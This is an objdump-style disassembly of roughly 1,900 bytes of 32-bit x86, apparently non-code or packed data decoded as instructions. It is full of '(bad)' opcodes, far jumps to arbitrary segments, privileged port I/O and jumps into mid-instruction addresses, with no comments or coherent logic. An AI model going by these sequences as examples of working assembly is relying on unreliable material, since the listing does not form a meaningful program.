  40b9d1:	mov    al,0x33
  40b9d3:	lods   eax,DWORD PTR ds:[esi]
  40b9d4:	mov    es,WORD PTR [ecx-0x9]
  40b9d7:	(bad)  
  40b9d8:	cwde   
  40b9d9:	dec    ebx
  40b9da:	call   0x23d2:0x36bea2c5
  40b9e1:	xor    ebx,ebp
  40b9e3:	inc    eax
  40b9e4:	push   esp
  40b9e5:	push   ecx
  40b9e6:	addr16 push cs
  40b9e8:	stc    
  40b9e9:	fwait
  40b9ea:	mov    ebx,edx
  40b9ec:	ror    BYTE PTR ds:[ebp-0x26],0xe2
  40b9f1:	push   edx
  40b9f2:	dec    edi
  40b9f3:	mov    cl,0x95
  40b9f5:	xor    eax,0x6cd225d0
  40b9fa:	sub    eax,0x2b2d796
  40b9ff:	jp     0x40ba74
  40ba01:	ins    DWORD PTR es:[edi],dx
  40ba02:	sbb    edx,esp
  40ba04:	jbe    0x40ba73
  40ba06:	nop
  40ba07:	jmp    0x7312b840
  40ba0c:	jae    0x40b9ca
  40ba0e:	and    esp,DWORD PTR [esi+eiz*8+0x5c6132]
  40ba15:	je     0x40ba19
  40ba17:	mov    DWORD PTR [ecx+edx*1-0x269cd57c],edx
  40ba1e:	pop    eax
  40ba1f:	mov    ecx,DWORD PTR [edx]
  40ba21:	lds    eax,FWORD PTR cs:[ecx]
  40ba24:	cmp    ebp,ebx
  40ba26:	cmc    
  40ba27:	mov    gs,WORD PTR [eax+0xd33adc5]
  40ba2d:	mov    eax,0xbc9f5e9f
  40ba32:	pop    ss
  40ba33:	fwait
  40ba34:	xlat   BYTE PTR ds:[ebx]
  40ba35:	xor    cl,BYTE PTR [esi]
  40ba37:	jmp    0x2a4c:0xed696e7f
  40ba3e:	in     al,0x6a
  40ba40:	xchg   ecx,eax
  40ba41:	out    0x45,al
  40ba43:	cmp    DWORD PTR [ecx],ecx
  40ba45:	ret    0xedca
  40ba48:	int    0x4f
  40ba4a:	sub    al,0x9d
  40ba4c:	dec    eax
  40ba4d:	adc    eax,0x1fbc0812
  40ba52:	repnz pop esi
  40ba54:	add    ah,ch
  40ba56:	sbb    BYTE PTR [esi-0x28],ah
  40ba59:	xchg   esp,eax
  40ba5a:	cmp    eax,0xffffffbd
  40ba5d:	ds jmp 0xb7e6:0xbb907f9e
  40ba65:	jno    0x40ba56
  40ba67:	jge    0x40bad7
  40ba69:	into   
  40ba6a:	jno    0x40ba99
  40ba6c:	mov    BYTE PTR [ecx+ebx*1-0x59],dh
  40ba70:	jge    0x40baaa
  40ba72:	shl    DWORD PTR [edx+0x72],cl
  40ba75:	enter  0x126b,0xc
  40ba79:	out    0xec,al
  40ba7b:	add    eax,0x5c87f6a2
  40ba80:	outs   dx,BYTE PTR ds:[esi]
  40ba81:	frstor [edx+0x5b]
  40ba84:	mov    eax,esi
  40ba86:	pop    ebp
  40ba87:	and    ecx,DWORD PTR ds:0xd4f7571e
  40ba8d:	mov    dh,0x4d
  40ba8f:	les    esi,FWORD PTR [eax-0x39]
  40ba92:	jl     0x40baa8
  40ba94:	(bad)  
  40ba96:	add    ah,BYTE PTR [edx+0x58763e5a]
  40ba9c:	inc    esi
  40ba9d:	mov    ds:0x99ae4c50,al
  40baa2:	jp     0x40baac
  40baa4:	test   DWORD PTR [edi+ebx*4-0xcde8ac7],0x11f747c2
  40baaf:	int3   
  40bab0:	sub    dh,BYTE PTR [edi]
  40bab2:	and    esi,esi
  40bab4:	stos   DWORD PTR es:[edi],eax
  40bab5:	pop    ebp
  40bab6:	test   DWORD PTR [ebx+0x52],ebp
  40bab9:	sbb    eax,DWORD PTR [ebx]
  40babb:	aaa    
  40babc:	loop   0x40ba69
  40babe:	mov    bl,0xc8
  40bac0:	push   0xffffff99
  40bac2:	retf   
  40bac3:	call   0x3480bd57
  40bac8:	loopne 0x40bb23
  40baca:	js     0x40bb43
  40bacc:	mov    al,0xca
  40bace:	pop    esi
  40bacf:	mov    ebp,0x581ab26e
  40bad4:	fld    QWORD PTR [esi-0x1d03aba1]
  40bada:	mov    DWORD PTR [eax],ebx
  40badc:	scas   al,BYTE PTR es:[edi]
  40badd:	(bad)  
  40bade:	xor    al,0x34
  40bae0:	push   edx
  40bae1:	outs   dx,BYTE PTR ds:[esi]
  40bae3:	adc    al,0x5f
  40bae5:	mov    eax,ds:0x70b705ec
  40baea:	fldenv [ecx-0x3c19ecbd]
  40baf0:	xchg   esi,eax
  40baf1:	jg     0x40bb49
  40baf3:	jmp    0xfd81:0xa4707fca
  40bafa:	fsub   DWORD PTR [esi+0x1db08f26]
  40bb00:	lds    ebx,FWORD PTR [edi+0x7c]
  40bb03:	jnp    0x40bb00
  40bb05:	stos   BYTE PTR es:[edi],al
  40bb06:	mov    dl,BYTE PTR [bx+si]
  40bb09:	xchg   DWORD PTR [eax-0x68],ecx
  40bb0c:	in     eax,dx
  40bb0d:	fmul   DWORD PTR [ebx-0x3d5461ee]
  40bb13:	mov    WORD PTR [edi],?
  40bb15:	adc    DWORD PTR [ecx-0x60],0x7c1cf303
  40bb1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb1d:	popf   
  40bb1e:	inc    ecx
  40bb1f:	icebp  
  40bb20:	es jl  0x40bb6c
  40bb23:	repz sbb al,0xfa
  40bb26:	mov    ebp,esi
  40bb28:	jle    0x40bb1b
  40bb2a:	mov    ah,0x12
  40bb2c:	ret    
  40bb2d:	add    DWORD PTR [ebx-0x2b],0x6fcf0b08
  40bb34:	or     DWORD PTR [edi+ecx*2],esi
  40bb37:	mov    ch,0xa4
  40bb39:	ror    DWORD PTR [edx],0xd4
  40bb3c:	pop    ss
  40bb3d:	sub    BYTE PTR [eax-0x6a],bl
  40bb40:	mov    ds:0x16984990,eax
  40bb45:	or     dh,al
  40bb47:	stc    
  40bb48:	pop    ecx
  40bb49:	ficom  WORD PTR [edx-0x512994d9]
  40bb4f:	or     ebx,DWORD PTR [ecx+0x6c]
  40bb52:	jp     0x40bae6
  40bb54:	dec    esp
  40bb55:	cwde   
  40bb56:	lds    esi,FWORD PTR gs:[esi-0x44]
  40bb5a:	xchg   BYTE PTR [ecx],cl
  40bb5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb5d:	scas   al,BYTE PTR es:[edi]
  40bb5e:	repz sub al,0xf2
  40bb61:	xor    eax,0xe82115b
  40bb66:	pop    esi
  40bb67:	es push 0x3deac586
  40bb6d:	mov    ah,0x26
  40bb6f:	cwde   
  40bb70:	jnp    0x40bb41
  40bb72:	out    0x17,al
  40bb74:	mul    edx
  40bb76:	mov    ah,0xc5
  40bb78:	(bad)  
  40bb79:	xchg   esp,eax
  40bb7a:	xor    bl,dh
  40bb7c:	jae    0x40bb7d
  40bb7e:	sbb    eax,0xa443e63f
  40bb83:	int    0x6a
  40bb85:	sbb    al,0x78
  40bb87:	jbe    0x40bb99
  40bb89:	xchg   edx,eax
  40bb8a:	dec    esi
  40bb8b:	pop    ss
  40bb8c:	inc    esi
  40bb8d:	outs   dx,DWORD PTR ds:[esi]
  40bb8e:	pushf  
  40bb8f:	aas    
  40bb90:	icebp  
  40bb91:	popf   
  40bb92:	(bad)  
  40bb93:	or     eax,0x9ae6d989
  40bb98:	out    dx,eax
  40bb99:	ret    0x4701
  40bb9c:	fwait
  40bb9d:	das    
  40bb9e:	stos   DWORD PTR es:[edi],eax
  40bb9f:	ds pop esp
  40bba1:	fs xor al,0x36
  40bba4:	test   BYTE PTR [edx+edx*1+0x71],0xa6
  40bba9:	push   edi
  40bbaa:	fnsave [edx]
  40bbac:	jno    0x40bb4e
  40bbae:	adc    dl,BYTE PTR [eax]
  40bbb0:	fdiv   QWORD PTR ds:0xbeaf11f7
  40bbb6:	add    eax,0x5adfdbbe
  40bbbb:	and    ch,dh
  40bbbd:	push   ds
  40bbbe:	jg     0x40bb8f
  40bbc0:	inc    esp
  40bbc1:	mov    bh,0x83
  40bbc3:	retf   
  40bbc4:	ins    DWORD PTR es:[edi],dx
  40bbc5:	std    
  40bbc6:	ror    ah,1
  40bbc8:	fsubr  QWORD PTR fs:[edx-0x16]
  40bbcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbcd:	adc    eax,0xaef3f59a
  40bbd2:	ss test al,0xe4
  40bbd5:	jp     0x40bbac
  40bbd7:	jl     0x40bbfb
  40bbd9:	sub    eax,0x9900d348
  40bbde:	xchg   esi,esp
  40bbe0:	test   bl,al
  40bbe2:	popf   
  40bbe3:	das    
  40bbe4:	pop    eax
  40bbe5:	cmc    
  40bbe6:	xchg   DWORD PTR [esi+0x3f],eax
  40bbe9:	ror    DWORD PTR [ebp+0x39f9a506],cl
  40bbef:	jmp    0x5ff5c049
  40bbf4:	shl    BYTE PTR [ecx-0x7d],1
  40bbf7:	fs cdq 
  40bbf9:	scas   eax,DWORD PTR es:[edi]
  40bbfa:	pop    ecx
  40bbfb:	es push ebp
  40bbfd:	fsubr  QWORD PTR [edi+0x5646a68]
  40bc03:	xor    dl,BYTE PTR [edx+0x41f37203]
  40bc09:	pop    ebx
  40bc0a:	pop    ss
  40bc0b:	push   edi
  40bc0c:	jl     0x40bc26
  40bc0e:	test   dh,ch
  40bc10:	popf   
  40bc11:	mov    eax,0x321152c2
  40bc16:	cmp    ebp,DWORD PTR [ebx+edx*2-0x7a7108ff]
  40bc1d:	xor    BYTE PTR [ebx-0x79],0x3
  40bc21:	(bad)
  40bc25:	push   es
  40bc26:	es js  0x40bbae
  40bc29:	add    eax,0xed91b440
  40bc2e:	or     al,0x3f
  40bc30:	(bad)  
  40bc32:	sub    eax,0x8489eaa0
  40bc37:	push   eax
  40bc38:	outs   dx,BYTE PTR ds:[esi]
  40bc39:	repnz fwait
  40bc3b:	add    eax,0xb9933593
  40bc40:	test   eax,0x56a7964b
  40bc45:	iret   
  40bc46:	mov    cl,0x71
  40bc48:	inc    edi
  40bc49:	push   0xcea9125a
  40bc4e:	mov    ds:0x862b8a55,al
  40bc53:	mov    DWORD PTR [ebp-0x53],ebx
  40bc56:	push   ds
  40bc57:	adc    ebx,DWORD PTR [eax-0x649a1fae]
  40bc5d:	lds    esp,FWORD PTR [ebx]
  40bc5f:	retf   
  40bc60:	push   es
  40bc61:	mov    ebp,0x2a66e23f
  40bc66:	iret   
  40bc67:	ss xchg edi,eax
  40bc69:	mov    esi,0x573a8d22
  40bc6e:	mov    ebp,0xd9ced536
  40bc73:	sub    al,0x9d
  40bc75:	add    BYTE PTR [esi+0x66f29efd],dh
  40bc7b:	mov    ds:0x14faf8b4,al
  40bc80:	fninit 
  40bc82:	aaa    
  40bc83:	pushf  
  40bc84:	jmp    0x2fd8:0x6e894d71
  40bc8b:	bound  ecx,QWORD PTR [edx-0x42]
  40bc8e:	mov    dh,0x27
  40bc91:	jbe    0x40bc45
  40bc93:	xchg   edx,eax
  40bc94:	repz scas al,BYTE PTR es:[edi]
  40bc96:	adc    edx,DWORD PTR [ecx]
  40bc98:	icebp  
  40bc99:	mov    cl,0x55
  40bc9b:	shld   DWORD PTR [edi],esi,cl
  40bc9e:	cmp    BYTE PTR [eax+0x2def26dc],dl
  40bca4:	cmp    ebx,DWORD PTR [edi]
  40bca6:	dec    ebx
  40bca7:	xchg   edx,eax
  40bca8:	push   eax
  40bca9:	push   ebp
  40bcaa:	imul   bl
  40bcac:	mov    esp,0xbd0cd9f0
  40bcb1:	pop    ds
  40bcb2:	cld    
  40bcb3:	pushf  
  40bcb4:	xor    al,0x2
  40bcb6:	inc    edx
  40bcb7:	push   es
  40bcb8:	sti    
  40bcb9:	push   ss
  40bcba:	push   ebx
  40bcbb:	(bad)  
  40bcbc:	out    0x28,al
  40bcbe:	hlt    
  40bcbf:	aaa    
  40bcc0:	std    
  40bcc1:	add    bl,ch
  40bcc3:	frstor [ebp+eax*2+0x65463997]
  40bcca:	jg     0x40bcfd
  40bccc:	ins    BYTE PTR es:[edi],dx
  40bccd:	jge    0x40bd4e
  40bccf:	cmp    DWORD PTR [edx+0x55d9126e],eax
  40bcd5:	stos   DWORD PTR es:[edi],eax
  40bcd6:	leave  
  40bcd7:	push   es
  40bcd8:	cmp    al,0x7e
  40bcda:	push   esi
  40bcdb:	jge    0x40bcde
  40bcdd:	scas   al,BYTE PTR es:[edi]
  40bcde:	pushf  
  40bcdf:	push   ecx
  40bce0:	jp     0x40bc7b
  40bce2:	cdq    
  40bce3:	call   0x9b457e58
  40bce8:	cmp    edi,esi
  40bcea:	mov    ebx,0x30ddc617
  40bcef:	es in  al,dx
  40bcf1:	ins    BYTE PTR es:[edi],dx
  40bcf2:	mov    dh,0x60
  40bcf4:	or     eax,0xf9bbf6c7
  40bcf9:	std    
  40bcfa:	lods   eax,DWORD PTR ds:[esi]
  40bcfb:	int    0x4
  40bcfd:	adc    eax,DWORD PTR [ebx+0x1d]
  40bd00:	div    DWORD PTR [eax+0x4b]
  40bd03:	jo     0x40bcc5
  40bd05:	in     al,0x7b
  40bd07:	sub    al,BYTE PTR [ecx-0x7]
  40bd0a:	cld    
  40bd0b:	xchg   DWORD PTR [ecx+esi*2-0x549198fc],ecx
  40bd12:	shl    BYTE PTR [ebx-0x4c],0x4b
  40bd16:	scas   eax,DWORD PTR es:[edi]
  40bd17:	cli    
  40bd18:	aaa    
  40bd19:	jae    0x40bcb7
  40bd1b:	pop    es
  40bd1c:	jp     0x40bcf6
  40bd1e:	mov    es,WORD PTR [edx]
  40bd20:	dec    esi
  40bd21:	or     ebp,DWORD PTR ds:0x436efd78
  40bd27:	adc    ah,0x4e
  40bd2a:	cwde   
  40bd2b:	in     al,dx
  40bd2c:	addr16 out 0x2a,eax
  40bd2f:	enter  0x62cd,0xb8
  40bd33:	add    al,0xdd
  40bd35:	sub    BYTE PTR [edx+ebx*4],al
  40bd38:	pop    eax
  40bd39:	aam    0xfc
  40bd3b:	fistp  QWORD PTR [esi+edx*2-0x470dcd03]
  40bd42:	mul    al
  40bd44:	mov    ch,0xd1
  40bd46:	ftst   
  40bd48:	icebp  
  40bd49:	(bad)  
  40bd4a:	iret   
  40bd4b:	adc    BYTE PTR cs:[ebx-0x15],al
  40bd4f:	push   esi
  40bd50:	test   BYTE PTR [ebx+edi*2],bl
  40bd53:	jb     0x40bd75
  40bd55:	jmp    0x3c70:0xbc750112
  40bd5c:	mov    ?,WORD PTR [ecx-0x5ccb754d]
  40bd62:	outs   dx,BYTE PTR ds:[esi]
  40bd63:	jae    0x40bd26
  40bd65:	or     DWORD PTR [ebp-0x6a4d6772],ebp
  40bd6b:	(bad)  
  40bd6c:	rcr    DWORD PTR ds:0xcbcaedef,cl
  40bd72:	or     BYTE PTR [ecx*4+0x4ce6de57],0x49
  40bd7a:	or     DWORD PTR [eax],0xffffff8b
  40bd7d:	repnz out 0x49,al
  40bd80:	inc    esp
  40bd81:	push   edi
  40bd82:	jae    0x40bd3f
  40bd84:	push   ecx
  40bd85:	adc    DWORD PTR [eax],esi
  40bd87:	dec    esp
  40bd88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd89:	mov    dh,0x9
  40bd8b:	pop    ss
  40bd8c:	pop    esp
  40bd8d:	ins    BYTE PTR es:[edi],dx
  40bd8e:	inc    ebp
  40bd8f:	cwde   
  40bd90:	loope  0x40bdca
  40bd92:	js     0x40bd77
  40bd94:	mov    esi,0xf7f553d2
  40bd99:	fcom   DWORD PTR [ebx-0xf6101c7]
  40bd9f:	dec    ebp
  40bda0:	inc    esp
  40bda1:	out    dx,eax
  40bda2:	ja     0x40be0b
  40bda4:	xor    al,0x78
  40bda6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bda7:	int    0x96
  40bda9:	xor    al,0xb9
  40bdab:	lock lahf 
  40bdad:	inc    ebp
  40bdae:	xchg   esp,eax
  40bdaf:	dec    edi
  40bdb0:	retf   
  40bdb1:	mov    dh,0x32
  40bdb3:	mov    ebp,0x665bdd53
  40bdb8:	(bad)  
  40bdb9:	imul   DWORD PTR [ebx-0x21de5433]
  40bdbf:	xchg   edi,eax
  40bdc0:	jns    0x40be15
  40bdc2:	pop    esp
  40bdc3:	mov    ecx,0x3cf2dcb2
  40bdc8:	in     eax,0x32
  40bdca:	jle    0x40bd8d
  40bdcc:	pop    eax
  40bdcd:	ins    DWORD PTR es:[edi],dx
  40bdce:	pop    ebp
  40bdcf:	ins    DWORD PTR es:[edi],dx
  40bdd0:	rcl    BYTE PTR [edi-0xa4d2a9],1
  40bdd6:	and    DWORD PTR [ecx],ebp
  40bdd8:	fadd   QWORD PTR [edi]
  40bdda:	push   ecx
  40bddb:	push   ecx
  40bddc:	aad    0x5a
  40bdde:	and    DWORD PTR [ebp+0x52cba42c],edi
  40bde4:	xchg   ecx,eax
  40bde5:	lea    esi,gs:[ecx+0x4a]
  40bde9:	pop    es
  40bdea:	mov    edi,ss
  40bdec:	cdq    
  40bded:	fwait
  40bdee:	jp     0x40be4e
  40bdf0:	fcom   QWORD PTR [ecx+0xa]
  40bdf3:	or     DWORD PTR [edi-0x1a6b0275],0xecf246f1
  40bdfd:	push   ecx
  40bdfe:	push   edx
  40bdff:	jle    0x40be3d
  40be01:	in     al,0x80
  40be03:	xchg   edi,eax
  40be04:	and    edi,DWORD PTR [edi+ebp*8]
  40be07:	stos   BYTE PTR es:[edi],al
  40be08:	pusha  
  40be09:	xchg   edi,eax
  40be0a:	call   0xb7ad:0x58b540fe
  40be11:	je     0x40be61
  40be13:	cmp    ecx,DWORD PTR [ecx+0x10]
  40be16:	jnp    0x40bdf6
  40be18:	inc    ecx
  40be19:	or     DWORD PTR [esp+eiz*4-0x74],ecx
  40be1d:	xchg   DWORD PTR [edi],eax
  40be1f:	xchg   ebx,eax
  40be20:	dec    ebp
  40be21:	add    dl,BYTE PTR [esi]
  40be23:	mov    ch,0x16
  40be25:	sbb    DWORD PTR [esi],ebx
  40be27:	hlt    
  40be28:	outs   dx,DWORD PTR ds:[esi]
  40be29:	mov    cl,0xe7
  40be2b:	test   BYTE PTR ds:0xc5819d7a,dh
  40be31:	inc    ebp
  40be32:	push   ebp
  40be33:	dec    ebx
  40be34:	cmp    al,0x69
  40be36:	mov    dl,0x1
  40be38:	mov    bl,0x87
  40be3a:	add    dl,cl
  40be3c:	pushf  
  40be3d:	popf   
  40be3e:	pop    ebx
  40be3f:	popf   
  40be40:	inc    DWORD PTR [ebp-0x26]
  40be43:	pop    edx
  40be44:	mov    ebx,0x869097ee
  40be49:	or     al,0x57
  40be4b:	or     ch,BYTE PTR cs:[ebx-0x7b]
  40be4f:	pop    edx
  40be50:	fsub   DWORD PTR [ebx]
  40be52:	add    BYTE PTR [eax-0x5],dl
  40be55:	xor    eax,0xd768af60
  40be5a:	test   BYTE PTR [esi+0x70],al
  40be5d:	add    edx,DWORD PTR [edx]
  40be5f:	push   ebx
  40be60:	jg     0x40be95
  40be62:	ret    
  40be63:	jnp    0x40be04
  40be65:	cmp    ebx,ecx
  40be67:	arpl   cx,ax
  40be69:	and    ebp,DWORD PTR [esi-0x2909d866]
  40be6f:	lock dec ebp
  40be71:	pop    ds
  40be72:	add    ch,BYTE PTR [ebx-0x5e]
  40be75:	add    eax,ecx
  40be77:	mov    dx,sp
  40be7a:	bound  ebx,QWORD PTR [eax-0x44]
  40be7d:	outs   dx,BYTE PTR ds:[esi]
  40be7e:	enter  0xfbd6,0x45
  40be82:	aaa    
  40be83:	in     al,0xef
  40be85:	fcmovnb st,st(6)
  40be87:	pop    esp
  40be88:	test   BYTE PTR [edx],0xbe
  40be8b:	push   ebx
  40be8c:	ror    BYTE PTR [ecx],cl
  40be8e:	pushf  
  40be8f:	push   es
  40be90:	adc    DWORD PTR [eax+edx*1+0x787f9d7b],esp
  40be97:	retf   0xb41c
  40be9a:	dec    edx
  40be9b:	adc    DWORD PTR [edi+0x3c],esi
  40be9e:	aas    
  40be9f:	jae    0x40be6f
  40bea1:	loop   0x40bf1e
  40bea3:	arpl   WORD PTR [ebx-0x742a71f5],ax
  40bea9:	adc    al,0x78
  40beab:	(bad)  
  40beac:	cli    
  40bead:	cwde   
  40beae:	jnp    0x40bed5
  40beb0:	sbb    eax,0x6e9c3542
  40beb5:	xor    BYTE PTR [edi+ebp*4+0x75],dh
  40beb9:	adc    eax,eax
  40bebb:	dec    edx
  40bebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bebd:	adc    DWORD PTR [ecx],esi
  40bebf:	arpl   cx,si
  40bec1:	jmp    0x4ce4b969
  40bec6:	idiv   BYTE PTR [ebp-0x36]
  40bec9:	mov    cl,0x6b
  40becb:	push   esi
  40becc:	test   eax,0x1d832dc9
  40bed1:	fadd   DWORD PTR [ebx+0x2d774816]
  40bed7:	mov    ds:0xb04a8f2d,eax
  40bedc:	and    ebx,ecx
  40bede:	out    0xa,al
  40bee0:	mov    ebx,0xe230f009
  40bee5:	pop    eax
  40bee6:	sbb    BYTE PTR [edi-0x3b],cl
  40bee9:	ror    BYTE PTR [edx],0x2
  40beec:	push   ds
  40beed:	mov    dl,0xb6
  40beef:	lock or bl,BYTE PTR [eax]
  40bef2:	rcr    cl,cl
  40bef4:	sbb    eax,0x5e8913db
  40bef9:	call   0xf04d:0xf361d54f
  40bf00:	les    ebx,FWORD PTR [eax+ebx*1+0x60]
  40bf04:	int3   
  40bf05:	add    edx,ebp
  40bf07:	fadd   DWORD PTR [ebp+0x537fcbcc]
  40bf0d:	xlat   BYTE PTR ds:[ebx]
  40bf0e:	push   ss
  40bf0f:	xor    eax,0x923e3f66
  40bf14:	mov    esp,DWORD PTR [esi]
  40bf16:	pop    esp
  40bf17:	setle  BYTE PTR [ecx+0x7]
  40bf1b:	add    eax,0xe8d08b88
  40bf20:	ins    BYTE PTR es:[edi],dx
  40bf21:	xor    eax,0x2634a0e5
  40bf26:	into   
  40bf27:	dec    ebp
  40bf28:	pop    edi
  40bf29:	add    esi,DWORD PTR [edx-0x67]
  40bf2c:	and    eax,0x4a477dec
  40bf31:	into   
  40bf32:	jo     0x40bf91
  40bf34:	adc    al,0x55
  40bf36:	fisub  WORD PTR [ebp-0x41ff0f31]
  40bf3c:	ds pop esp
  40bf3e:	aad    0x2f
  40bf40:	cmp    eax,0x961426e4
  40bf45:	cwde   
  40bf46:	test   eax,0x27c9f542
  40bf4b:	int    0x9a
  40bf4d:	push   ebx
  40bf4e:	dec    ebp
  40bf4f:	loop   0x40bfc3
  40bf51:	repnz in eax,0xa3
  40bf54:	dec    eax
  40bf55:	test   BYTE PTR [esi+0x976dcf4],al
  40bf5b:	ss inc ebp
  40bf5d:	into   
  40bf5e:	in     al,dx
  40bf5f:	xor    eax,0x2e89ebbe
  40bf64:	cmp    DWORD PTR [esi+ecx*2+0x70],ecx
  40bf68:	int3   
  40bf69:	imul   ebp,DWORD PTR [edi-0x1b9476ff],0x1c2ca75f
  40bf73:	ss dec edx
  40bf75:	jmp    0xa2b5b148
  40bf7a:	push   ebx
  40bf7b:	nop
  40bf7c:	add    eax,0xb2fafa76
  40bf81:	out    dx,eax
  40bf82:	adc    ecx,esi
  40bf84:	data16 ficomp DWORD PTR [ebx]
  40bf87:	push   ebx
  40bf88:	nop
  40bf89:	mov    DWORD PTR [ecx-0x46],ebx
  40bf8c:	push   ecx
  40bf8d:	and    dl,ah
  40bf8f:	xlat   BYTE PTR ds:[ebx]
  40bf90:	or     eax,0x8c034cb1
  40bf95:	loope  0x40bf1c
  40bf97:	jle    0x40c014
  40bf99:	or     BYTE PTR [ebx-0x27],cl
  40bf9c:	int    0x96
  40bf9e:	dec    esi
  40bf9f:	call   0xdc731758
  40bfa4:	xor    al,0x68
  40bfa6:	(bad)  
  40bfa8:	das    
  40bfa9:	cmp    cl,dh
  40bfab:	je     0x40bfeb
  40bfad:	stos   DWORD PTR es:[edi],eax
  40bfae:	mov    WORD PTR [edx],?
  40bfb0:	lea    ecx,[esi+0x59]
  40bfb3:	retf   0x2d52
  40bfb6:	(bad)
  40bfb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfba:	and    al,0xa0
  40bfbc:	dec    ecx
  40bfbd:	push   ebx
  40bfbe:	jmp    0x40bfd3
  40bfc0:	cli    
  40bfc1:	rol    dh,1
  40bfc3:	addr16 mov edi,0x2f3309c
  40bfc9:	xchg   esi,eax
  40bfca:	sub    bh,BYTE PTR [esi]
  40bfcc:	loop   0x40bfdc
  40bfce:	jecxz  0x40bfd2
  40bfd0:	out    0x6b,eax
  40bfd2:	adc    DWORD PTR [eax-0x6d],edi
  40bfd5:	or     eax,0x49d5a1de
  40bfda:	add    DWORD PTR [ebp-0x39],esp
  40bfdd:	js     0x40bf93
  40bfdf:	js     0x40c006
  40bfe1:	js     0x40c056
  40bfe3:	sub    esi,edx
  40bfe5:	mov    esi,0x9f83c7d8
  40bfea:	fnstcw WORD PTR [ebp+edi*2-0x44e74279]
  40bff1:	test   BYTE PTR [esi+0x396d4272],ah
  40bff7:	mov    cl,0xac
  40bff9:	ins    BYTE PTR es:[edi],dx
  40bffa:	cmp    BYTE PTR [ecx],0xc8
  40bffd:	repz test eax,0x9c2f1fb4
  40c003:	aaa    
  40c004:	jmp    0x3674d2d1
  40c009:	mov    ah,0x17
  40c00b:	scas   al,BYTE PTR es:[edi]
  40c00c:	pop    ecx
  40c00d:	inc    ecx
  40c00e:	jae    0x40bfff
  40c010:	clc    
  40c011:	xor    al,BYTE PTR [eax-0x64]
  40c014:	loop   0x40c007
  40c016:	std    
  40c017:	xor    edx,DWORD PTR [ecx+ecx*4-0x2a]
  40c01b:	mov    fs,WORD PTR [eax+0x6b5da60d]
  40c021:	adc    DWORD PTR [esi-0x45],edi
  40c024:	xchg   ecx,eax
  40c025:	dec    edi
  40c026:	mov    ah,0x2
  40c028:	out    0x92,al
  40c02a:	fild   DWORD PTR [edi+0x52]
  40c02d:	dec    edi
  40c02e:	dec    ebx
  40c02f:	sub    ch,BYTE PTR [ebx]
  40c031:	sub    ah,BYTE PTR [ebx+ecx*2+0x6af5cfd4]
  40c038:	rol    DWORD PTR [edx+0x6b],cl
  40c03b:	jbe    0x40bfcb
  40c03d:	xor    eax,0x9851e706
  40c042:	inc    ebp
  40c043:	push   edi
  40c044:	shr    BYTE PTR [ebx],cl
  40c046:	cmp    al,0x85
  40c048:	enter  0x8ca3,0xa4
  40c04c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c04d:	sbb    al,0x61
  40c04f:	gs sbb al,0x5a
  40c052:	push   edx
  40c053:	dec    ebx
  40c054:	sub    ch,BYTE PTR [ebx+0x4e]
  40c057:	fs stos BYTE PTR es:[di],al
  40c05a:	sub    BYTE PTR [esi+0x42414960],dl
  40c060:	pop    edi
  40c061:	jno    0x40c081
  40c063:	aam    0x2c
  40c065:	popa   
  40c066:	lds    esi,FWORD PTR ds:0xc36ebb6d
  40c06c:	mov    esp,DWORD PTR [ebx]
  40c06e:	retf   0xe67d
  40c071:	cmp    BYTE PTR [eax],al
  40c073:	shld   DWORD PTR [ecx],eax,cl
  40c076:	adc    ch,bl
  40c078:	in     al,0x75
  40c07a:	mov    ecx,eax
  40c07c:	and    dh,BYTE PTR [edx-0x22a7e0d2]
  40c082:	js     0x40c0f7
  40c084:	inc    edi
  40c085:	mov    al,0xe0
  40c087:	cmc    
  40c088:	dec    eax
  40c089:	sub    ah,BYTE PTR [ebx+ecx*2+0x23eb7e7f]
  40c090:	call   0x51b5e70b
  40c095:	call   0x2cab:0xce6390b
  40c09c:	mov    ebp,0xa6ee7aa7
  40c0a1:	out    0xc7,al
  40c0a3:	ss daa 
  40c0a5:	xor    BYTE PTR [edi-0x52870438],cl
  40c0ab:	dec    esi
  40c0ac:	loope  0x40c069
  40c0ae:	sbb    ch,ch
  40c0b0:	aas    
  40c0b1:	ins    BYTE PTR es:[edi],dx
  40c0b2:	shl    BYTE PTR [ebx-0x6a62055a],cl
  40c0b8:	push   ecx
  40c0b9:	ficom  WORD PTR [ebp+0x18]
  40c0bc:	out    dx,eax
  40c0bd:	out    0x65,al
  40c0bf:	(bad)  
  40c0c0:	jge    0x40c0cb
  40c0c2:	push   ss
  40c0c3:	sub    BYTE PTR [ebp+0x6e],0xd
  40c0c7:	(bad)  
  40c0c8:	pop    ebx
  40c0c9:	out    0x8d,al
  40c0cb:	test   DWORD PTR [eax+0x6edae36d],ecx
  40c0d1:	pusha  
  40c0d2:	pusha  
  40c0d3:	cmp    DWORD PTR [esi+esi*8-0x4c],ecx
  40c0d7:	xchg   ecx,esp
  40c0d9:	mov    edx,0x912033bd
  40c0de:	les    esp,FWORD PTR [edx-0x67ced0bf]
  40c0e4:	lds    edi,FWORD PTR [edx-0x79]
  40c0e7:	les    esp,FWORD PTR [eax]
  40c0e9:	fwait
  40c0ea:	js     0x40c0a3
  40c0ec:	cmp    eax,ecx
  40c0ee:	js     0x40c0cd
  40c0f0:	retf   
  40c0f1:	(bad)  
  40c0f2:	mov    ch,0x62
  40c0f4:	outs   dx,BYTE PTR ds:[esi]
  40c0f5:	cmp    eax,0x49dad6cf
  40c0fa:	test   al,0x70
  40c0fc:	push   esi
  40c0fd:	pop    eax
  40c0fe:	pop    eax
  40c0ff:	enterw 0x429b,0x2c
  40c104:	in     al,0xea
  40c106:	adc    dl,bl
  40c108:	mov    dl,0x7d
  40c10a:	mov    ah,0x52
  40c10c:	(bad)  
  40c10d:	dec    ecx
  40c10e:	icebp  
  40c10f:	pop    ds
  40c110:	sub    DWORD PTR [esi+0x5b],ebx
  40c113:	pop    ecx
  40c114:	data16 sbb al,0xcb
  40c117:	cdq    
  40c118:	mov    ch,0xd3
  40c11a:	sub    eax,0xee78abb
  40c11f:	xchg   ebp,eax
  40c120:	popa   
  40c121:	push   edx
